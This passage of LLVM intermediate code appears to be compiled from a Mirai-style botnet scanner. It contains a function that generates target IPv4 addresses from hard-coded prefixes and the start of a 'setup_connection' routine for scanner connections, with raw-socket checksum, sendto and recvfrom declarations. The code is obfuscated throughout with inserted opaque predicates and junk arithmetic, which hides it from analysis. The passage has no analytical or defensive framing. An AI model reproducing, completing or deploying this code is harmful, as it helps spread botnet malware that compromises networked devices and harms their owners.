  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %47, label %42

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 127
  br label %47

; <label>:47:                                     ; preds = %42, %originalBBpart2
  %48 = phi i1 [ true, %originalBBpart2 ], [ %46, %42 ]
  br i1 %48, label %4, label %49

; <label>:49:                                     ; preds = %47
  %50 = load i32, i32* @x.11
  %51 = load i32, i32* @y.12
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %49
  %58 = call i32 @rand_next()
  %59 = urem i32 %58, 35
  store i32 %59, i32* %3, align 4
  %60 = load i32, i32* %3, align 4
  %61 = icmp eq i32 %60, 0
  %62 = load i32, i32* @x.11
  %63 = load i32, i32* @y.12
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br i1 %61, label %70, label %87

; <label>:70:                                     ; preds = %originalBBpart26
  %71 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %72 = load i8, i8* %71, align 1
  %73 = zext i8 %72 to i32
  %74 = shl i32 %73, 16
  %75 = or i32 1996488704, %74
  %76 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %77 = load i8, i8* %76, align 1
  %78 = zext i8 %77 to i32
  %79 = shl i32 %78, 8
  %80 = or i32 %75, %79
  %81 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = shl i32 %83, 0
  %85 = or i32 %80, %84
  %86 = call i32 @htonl(i32 %85) #9
  store i32 %86, i32* %1, align 4
  br label %382

; <label>:87:                                     ; preds = %originalBBpart26
  %88 = load i32, i32* @x.11
  %89 = load i32, i32* @y.12
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %87
  %96 = load i32, i32* %3, align 4
  %97 = icmp eq i32 %96, 1
  %98 = load i32, i32* @x.11
  %99 = load i32, i32* @y.12
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br i1 %97, label %106, label %118

; <label>:106:                                    ; preds = %originalBBpart210
  %107 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %108 = load i8, i8* %107, align 1
  %109 = zext i8 %108 to i32
  %110 = shl i32 %109, 8
  %111 = or i32 2006777856, %110
  %112 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = shl i32 %114, 0
  %116 = or i32 %111, %115
  %117 = call i32 @htonl(i32 %116) #9
  store i32 %117, i32* %1, align 4
  br label %382

; <label>:118:                                    ; preds = %originalBBpart210
  %119 = load i32, i32* @x.11
  %120 = load i32, i32* @y.12
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %118
  %127 = load i32, i32* %3, align 4
  %128 = icmp eq i32 %127, 2
  %129 = load i32, i32* @x.11
  %130 = load i32, i32* @y.12
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %128, label %137, label %149

; <label>:137:                                    ; preds = %originalBBpart214
  %138 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %139 = load i8, i8* %138, align 1
  %140 = zext i8 %139 to i32
  %141 = shl i32 %140, 8
  %142 = or i32 2006843392, %141
  %143 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %144 = load i8, i8* %143, align 1
  %145 = zext i8 %144 to i32
  %146 = shl i32 %145, 0
  %147 = or i32 %142, %146
  %148 = call i32 @htonl(i32 %147) #9
  store i32 %148, i32* %1, align 4
  br label %382

; <label>:149:                                    ; preds = %originalBBpart214
  %150 = load i32, i32* @x.11
  %151 = load i32, i32* @y.12
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %149
  %158 = load i32, i32* %3, align 4
  %159 = icmp eq i32 %158, 3
  %160 = load i32, i32* @x.11
  %161 = load i32, i32* @y.12
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br i1 %159, label %168, label %201

; <label>:168:                                    ; preds = %originalBBpart218
  %169 = load i32, i32* @x.11
  %170 = load i32, i32* @y.12
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %168
  %177 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %178 = load i8, i8* %177, align 1
  %179 = zext i8 %178 to i32
  %180 = shl i32 %179, 16
  %181 = or i32 1946157056, %180
  %182 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %183 = load i8, i8* %182, align 1
  %184 = zext i8 %183 to i32
  %185 = shl i32 %184, 8
  %186 = or i32 %181, %185
  %187 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %188 = load i8, i8* %187, align 1
  %189 = zext i8 %188 to i32
  %190 = shl i32 %189, 0
  %191 = or i32 %186, %190
  %192 = call i32 @htonl(i32 %191) #9
  store i32 %192, i32* %1, align 4
  %193 = load i32, i32* @x.11
  %194 = load i32, i32* @y.12
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBBpart263, label %originalBB20alteredBB

originalBBpart263:                                ; preds = %originalBB20
  br label %382

; <label>:201:                                    ; preds = %originalBBpart218
  %202 = load i32, i32* %3, align 4
  %203 = icmp eq i32 %202, 4
  br i1 %203, label %204, label %221

; <label>:204:                                    ; preds = %201
  %205 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %206 = load i8, i8* %205, align 1
  %207 = zext i8 %206 to i32
  %208 = shl i32 %207, 16
  %209 = or i32 -1174405120, %208
  %210 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = shl i32 %212, 8
  %214 = or i32 %209, %213
  %215 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %216 = load i8, i8* %215, align 1
  %217 = zext i8 %216 to i32
  %218 = shl i32 %217, 0
  %219 = or i32 %214, %218
  %220 = call i32 @htonl(i32 %219) #9
  store i32 %220, i32* %1, align 4
  br label %382

; <label>:221:                                    ; preds = %201
  %222 = load i32, i32* %3, align 4
  %223 = icmp eq i32 %222, 5
  br i1 %223, label %224, label %257

; <label>:224:                                    ; preds = %221
  %225 = load i32, i32* @x.11
  %226 = load i32, i32* @y.12
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %224
  %233 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %234 = load i8, i8* %233, align 1
  %235 = zext i8 %234 to i32
  %236 = shl i32 %235, 16
  %237 = or i32 -1325400064, %236
  %238 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %239 = load i8, i8* %238, align 1
  %240 = zext i8 %239 to i32
  %241 = shl i32 %240, 8
  %242 = or i32 %237, %241
  %243 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %244 = load i8, i8* %243, align 1
  %245 = zext i8 %244 to i32
  %246 = shl i32 %245, 0
  %247 = or i32 %242, %246
  %248 = call i32 @htonl(i32 %247) #9
  store i32 %248, i32* %1, align 4
  %249 = load i32, i32* @x.11
  %250 = load i32, i32* @y.12
  %251 = sub i32 %249, 1
  %252 = mul i32 %249, %251
  %253 = urem i32 %252, 2
  %254 = icmp eq i32 %253, 0
  %255 = icmp slt i32 %250, 10
  %256 = or i1 %254, %255
  br i1 %256, label %originalBBpart2120, label %originalBB65alteredBB

originalBBpart2120:                               ; preds = %originalBB65
  br label %382

; <label>:257:                                    ; preds = %221
  %258 = load i32, i32* %3, align 4
  %259 = icmp eq i32 %258, 6
  br i1 %259, label %263, label %260

; <label>:260:                                    ; preds = %257
  %261 = load i32, i32* %3, align 4
  %262 = icmp eq i32 %261, 7
  br i1 %262, label %263, label %275

; <label>:263:                                    ; preds = %260, %257
  %264 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %265 = load i8, i8* %264, align 1
  %266 = zext i8 %265 to i32
  %267 = shl i32 %266, 8
  %268 = or i32 1022558208, %267
  %269 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %270 = load i8, i8* %269, align 1
  %271 = zext i8 %270 to i32
  %272 = shl i32 %271, 0
  %273 = or i32 %268, %272
  %274 = call i32 @htonl(i32 %273) #9
  store i32 %274, i32* %1, align 4
  br label %382

; <label>:275:                                    ; preds = %260
  %276 = load i32, i32* %3, align 4
  %277 = icmp eq i32 %276, 10
  br i1 %277, label %281, label %278

; <label>:278:                                    ; preds = %275
  %279 = load i32, i32* %3, align 4
  %280 = icmp eq i32 %279, 11
  br i1 %280, label %281, label %309

; <label>:281:                                    ; preds = %278, %275
  %282 = load i32, i32* @x.11
  %283 = load i32, i32* @y.12
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %281
  %290 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %291 = load i8, i8* %290, align 1
  %292 = zext i8 %291 to i32
  %293 = shl i32 %292, 8
  %294 = or i32 1935802368, %293
  %295 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %296 = load i8, i8* %295, align 1
  %297 = zext i8 %296 to i32
  %298 = shl i32 %297, 0
  %299 = or i32 %294, %298
  %300 = call i32 @htonl(i32 %299) #9
  store i32 %300, i32* %1, align 4
  %301 = load i32, i32* @x.11
  %302 = load i32, i32* @y.12
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart2151, label %originalBB122alteredBB

originalBBpart2151:                               ; preds = %originalBB122
  br label %382

; <label>:309:                                    ; preds = %278
  %310 = load i32, i32* %3, align 4
  %311 = icmp eq i32 %310, 12
  br i1 %311, label %315, label %312

; <label>:312:                                    ; preds = %309
  %313 = load i32, i32* %3, align 4
  %314 = icmp eq i32 %313, 13
  br i1 %314, label %315, label %327

; <label>:315:                                    ; preds = %312, %309
  %316 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %317 = load i8, i8* %316, align 1
  %318 = zext i8 %317 to i32
  %319 = shl i32 %318, 8
  %320 = or i32 -875298816, %319
  %321 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = shl i32 %323, 0
  %325 = or i32 %320, %324
  %326 = call i32 @htonl(i32 %325) #9
  store i32 %326, i32* %1, align 4
  br label %382

; <label>:327:                                    ; preds = %312
  %328 = load i32, i32* %3, align 4
  %329 = icmp eq i32 %328, 8
  br i1 %329, label %333, label %330

; <label>:330:                                    ; preds = %327
  %331 = load i32, i32* %3, align 4
  %332 = icmp eq i32 %331, 9
  br i1 %332, label %333, label %345

; <label>:333:                                    ; preds = %330, %327
  %334 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %335 = load i8, i8* %334, align 1
  %336 = zext i8 %335 to i32
  %337 = shl i32 %336, 8
  %338 = or i32 453443584, %337
  %339 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %340 = load i8, i8* %339, align 1
  %341 = zext i8 %340 to i32
  %342 = shl i32 %341, 0
  %343 = or i32 %338, %342
  %344 = call i32 @htonl(i32 %343) #9
  store i32 %344, i32* %1, align 4
  br label %382

; <label>:345:                                    ; preds = %330
  %346 = load i32, i32* @x.11
  %347 = load i32, i32* @y.12
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %345
  %354 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %355 = load i8, i8* %354, align 1
  %356 = zext i8 %355 to i32
  %357 = shl i32 %356, 24
  %358 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %359 = load i8, i8* %358, align 1
  %360 = zext i8 %359 to i32
  %361 = shl i32 %360, 16
  %362 = or i32 %357, %361
  %363 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i32
  %366 = shl i32 %365, 8
  %367 = or i32 %362, %366
  %368 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %369 = load i8, i8* %368, align 1
  %370 = zext i8 %369 to i32
  %371 = shl i32 %370, 0
  %372 = or i32 %367, %371
  %373 = call i32 @htonl(i32 %372) #9
  store i32 %373, i32* %1, align 4
  %374 = load i32, i32* @x.11
  %375 = load i32, i32* @y.12
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart2202, label %originalBB153alteredBB

originalBBpart2202:                               ; preds = %originalBB153
  br label %382

; <label>:382:                                    ; preds = %originalBBpart2202, %333, %315, %originalBBpart2151, %263, %originalBBpart2120, %204, %originalBBpart263, %137, %106, %70
  %383 = load i32, i32* %1, align 4
  ret i32 %383

originalBBalteredBB:                              ; preds = %originalBB, %21
  %384 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %385 = load i8, i8* %384, align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %49
  %388 = call i32 @rand_next()
  %_ = shl i32 %388, 35
  %_2 = sub i32 0, %388
  %gen = add i32 %_2, 35
  %_3 = sub i32 0, %388
  %gen4 = add i32 %_3, 35
  %389 = urem i32 %388, 35
  store i32 %389, i32* %3, align 4
  %390 = load i32, i32* %3, align 4
  %391 = icmp eq i32 %390, 0
  br label %originalBB1

originalBB8alteredBB:                             ; preds = %originalBB8, %87
  %392 = load i32, i32* %3, align 4
  %393 = icmp eq i32 %392, 1
  br label %originalBB8

originalBB12alteredBB:                            ; preds = %originalBB12, %118
  %394 = load i32, i32* %3, align 4
  %395 = icmp eq i32 %394, 2
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %149
  %396 = load i32, i32* %3, align 4
  %397 = icmp eq i32 %396, 3
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %168
  %398 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %399 = load i8, i8* %398, align 1
  %400 = zext i8 %399 to i32
  %_21 = sub i32 0, %400
  %gen22 = add i32 %_21, 16
  %_23 = sub i32 0, %400
  %gen24 = add i32 %_23, 16
  %_25 = sub i32 0, %400
  %gen26 = add i32 %_25, 16
  %_27 = shl i32 %400, 16
  %401 = shl i32 %400, 16
  %_28 = shl i32 1946157056, %401
  %402 = or i32 1946157056, %401
  %403 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %404 = load i8, i8* %403, align 1
  %405 = zext i8 %404 to i32
  %_29 = shl i32 %405, 8
  %_30 = sub i32 0, %405
  %gen31 = add i32 %_30, 8
  %_32 = sub i32 0, %405
  %gen33 = add i32 %_32, 8
  %_34 = sub i32 0, %405
  %gen35 = add i32 %_34, 8
  %_36 = sub i32 0, %405
  %gen37 = add i32 %_36, 8
  %406 = shl i32 %405, 8
  %_38 = sub i32 0, %402
  %gen39 = add i32 %_38, %406
  %_40 = sub i32 0, %402
  %gen41 = add i32 %_40, %406
  %_42 = shl i32 %402, %406
  %_43 = shl i32 %402, %406
  %_44 = shl i32 %402, %406
  %_45 = shl i32 %402, %406
  %407 = or i32 %402, %406
  %408 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %409 = load i8, i8* %408, align 1
  %410 = zext i8 %409 to i32
  %_46 = sub i32 %410, 0
  %gen47 = mul i32 %_46, 0
  %_48 = sub i32 0, %410
  %gen49 = add i32 %_48, 0
  %_50 = sub i32 %410, 0
  %gen51 = mul i32 %_50, 0
  %_52 = shl i32 %410, 0
  %_53 = shl i32 %410, 0
  %_54 = sub i32 0, %410
  %gen55 = add i32 %_54, 0
  %411 = shl i32 %410, 0
  %_56 = shl i32 %407, %411
  %_57 = sub i32 0, %407
  %gen58 = add i32 %_57, %411
  %_59 = shl i32 %407, %411
  %_60 = sub i32 %407, %411
  %gen61 = mul i32 %_60, %411
  %412 = or i32 %407, %411
  %413 = call i32 @htonl(i32 %412) #9
  store i32 %413, i32* %1, align 4
  br label %originalBB20

originalBB65alteredBB:                            ; preds = %originalBB65, %224
  %414 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %415 = load i8, i8* %414, align 1
  %416 = zext i8 %415 to i32
  %_66 = sub i32 %416, 16
  %gen67 = mul i32 %_66, 16
  %_68 = shl i32 %416, 16
  %_69 = sub i32 0, %416
  %gen70 = add i32 %_69, 16
  %_71 = sub i32 0, %416
  %gen72 = add i32 %_71, 16
  %_73 = shl i32 %416, 16
  %_74 = shl i32 %416, 16
  %_75 = sub i32 0, %416
  %gen76 = add i32 %_75, 16
  %_77 = sub i32 %416, 16
  %gen78 = mul i32 %_77, 16
  %417 = shl i32 %416, 16
  %_79 = sub i32 -1325400064, %417
  %gen80 = mul i32 %_79, %417
  %_81 = sub i32 -1325400064, %417
  %gen82 = mul i32 %_81, %417
  %_83 = sub i32 0, -1325400064
  %gen84 = add i32 %_83, %417
  %_85 = shl i32 -1325400064, %417
  %_86 = sub i32 0, -1325400064
  %gen87 = add i32 %_86, %417
  %_88 = sub i32 0, -1325400064
  %gen89 = add i32 %_88, %417
  %_90 = sub i32 -1325400064, %417
  %gen91 = mul i32 %_90, %417
  %_92 = sub i32 0, -1325400064
  %gen93 = add i32 %_92, %417
  %_94 = sub i32 0, -1325400064
  %gen95 = add i32 %_94, %417
  %418 = or i32 -1325400064, %417
  %419 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %420 = load i8, i8* %419, align 1
  %421 = zext i8 %420 to i32
  %_96 = sub i32 0, %421
  %gen97 = add i32 %_96, 8
  %422 = shl i32 %421, 8
  %_98 = shl i32 %418, %422
  %_99 = sub i32 %418, %422
  %gen100 = mul i32 %_99, %422
  %_101 = sub i32 0, %418
  %gen102 = add i32 %_101, %422
  %_103 = sub i32 %418, %422
  %gen104 = mul i32 %_103, %422
  %_105 = shl i32 %418, %422
  %_106 = shl i32 %418, %422
  %_107 = shl i32 %418, %422
  %423 = or i32 %418, %422
  %424 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %425 = load i8, i8* %424, align 1
  %426 = zext i8 %425 to i32
  %_108 = sub i32 0, %426
  %gen109 = add i32 %_108, 0
  %_110 = shl i32 %426, 0
  %427 = shl i32 %426, 0
  %_111 = shl i32 %423, %427
  %_112 = shl i32 %423, %427
  %_113 = sub i32 %423, %427
  %gen114 = mul i32 %_113, %427
  %_115 = sub i32 0, %423
  %gen116 = add i32 %_115, %427
  %_117 = sub i32 0, %423
  %gen118 = add i32 %_117, %427
  %428 = or i32 %423, %427
  %429 = call i32 @htonl(i32 %428) #9
  store i32 %429, i32* %1, align 4
  br label %originalBB65

originalBB122alteredBB:                           ; preds = %originalBB122, %281
  %430 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %431 = load i8, i8* %430, align 1
  %432 = zext i8 %431 to i32
  %_123 = shl i32 %432, 8
  %_124 = sub i32 0, %432
  %gen125 = add i32 %_124, 8
  %_126 = shl i32 %432, 8
  %_127 = sub i32 %432, 8
  %gen128 = mul i32 %_127, 8
  %433 = shl i32 %432, 8
  %_129 = sub i32 1935802368, %433
  %gen130 = mul i32 %_129, %433
  %_131 = sub i32 1935802368, %433
  %gen132 = mul i32 %_131, %433
  %_133 = sub i32 0, 1935802368
  %gen134 = add i32 %_133, %433
  %_135 = sub i32 1935802368, %433
  %gen136 = mul i32 %_135, %433
  %_137 = sub i32 1935802368, %433
  %gen138 = mul i32 %_137, %433
  %_139 = sub i32 1935802368, %433
  %gen140 = mul i32 %_139, %433
  %_141 = sub i32 0, 1935802368
  %gen142 = add i32 %_141, %433
  %_143 = sub i32 1935802368, %433
  %gen144 = mul i32 %_143, %433
  %434 = or i32 1935802368, %433
  %435 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %436 = load i8, i8* %435, align 1
  %437 = zext i8 %436 to i32
  %_145 = sub i32 %437, 0
  %gen146 = mul i32 %_145, 0
  %_147 = shl i32 %437, 0
  %438 = shl i32 %437, 0
  %_148 = shl i32 %434, %438
  %_149 = shl i32 %434, %438
  %439 = or i32 %434, %438
  %440 = call i32 @htonl(i32 %439) #9
  store i32 %440, i32* %1, align 4
  br label %originalBB122

originalBB153alteredBB:                           ; preds = %originalBB153, %345
  %441 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 0
  %442 = load i8, i8* %441, align 1
  %443 = zext i8 %442 to i32
  %_154 = sub i32 %443, 24
  %gen155 = mul i32 %_154, 24
  %444 = shl i32 %443, 24
  %445 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 1
  %446 = load i8, i8* %445, align 1
  %447 = zext i8 %446 to i32
  %_156 = shl i32 %447, 16
  %_157 = sub i32 %447, 16
  %gen158 = mul i32 %_157, 16
  %_159 = sub i32 %447, 16
  %gen160 = mul i32 %_159, 16
  %_161 = sub i32 0, %447
  %gen162 = add i32 %_161, 16
  %_163 = shl i32 %447, 16
  %_164 = sub i32 %447, 16
  %gen165 = mul i32 %_164, 16
  %448 = shl i32 %447, 16
  %_166 = shl i32 %444, %448
  %_167 = shl i32 %444, %448
  %_168 = sub i32 0, %444
  %gen169 = add i32 %_168, %448
  %449 = or i32 %444, %448
  %450 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 2
  %451 = load i8, i8* %450, align 1
  %452 = zext i8 %451 to i32
  %_170 = sub i32 0, %452
  %gen171 = add i32 %_170, 8
  %_172 = sub i32 0, %452
  %gen173 = add i32 %_172, 8
  %_174 = shl i32 %452, 8
  %_175 = sub i32 0, %452
  %gen176 = add i32 %_175, 8
  %_177 = sub i32 0, %452
  %gen178 = add i32 %_177, 8
  %_179 = sub i32 %452, 8
  %gen180 = mul i32 %_179, 8
  %_181 = sub i32 0, %452
  %gen182 = add i32 %_181, 8
  %_183 = shl i32 %452, 8
  %453 = shl i32 %452, 8
  %_184 = sub i32 0, %449
  %gen185 = add i32 %_184, %453
  %_186 = sub i32 %449, %453
  %gen187 = mul i32 %_186, %453
  %_188 = shl i32 %449, %453
  %_189 = sub i32 0, %449
  %gen190 = add i32 %_189, %453
  %454 = or i32 %449, %453
  %455 = getelementptr inbounds [4 x i8], [4 x i8]* %2, i64 0, i64 3
  %456 = load i8, i8* %455, align 1
  %457 = zext i8 %456 to i32
  %_191 = shl i32 %457, 0
  %_192 = sub i32 0, %457
  %gen193 = add i32 %_192, 0
  %_194 = sub i32 0, %457
  %gen195 = add i32 %_194, 0
  %_196 = sub i32 0, %457
  %gen197 = add i32 %_196, 0
  %458 = shl i32 %457, 0
  %_198 = shl i32 %454, %458
  %_199 = sub i32 %454, %458
  %gen200 = mul i32 %_199, %458
  %459 = or i32 %454, %458
  %460 = call i32 @htonl(i32 %459) #9
  store i32 %460, i32* %1, align 4
  br label %originalBB153
}

declare zeroext i16 @checksum_generic(i16*, i32) #2

declare zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #2

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 2
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %33

; <label>:10:                                     ; preds = %1
  %11 = load i32, i32* @x.13
  %12 = load i32, i32* @y.14
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 2
  %21 = load i32, i32* %20, align 8
  %22 = call i32 @close(i32 %21)
  %23 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %24 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %23, i32 0, i32 2
  store i32 -1, i32* %24, align 8
  %25 = load i32, i32* @x.13
  %26 = load i32, i32* @y.14
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %33

; <label>:33:                                     ; preds = %originalBBpart2, %1
  %34 = load i32, i32* @x.13
  %35 = load i32, i32* @y.14
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

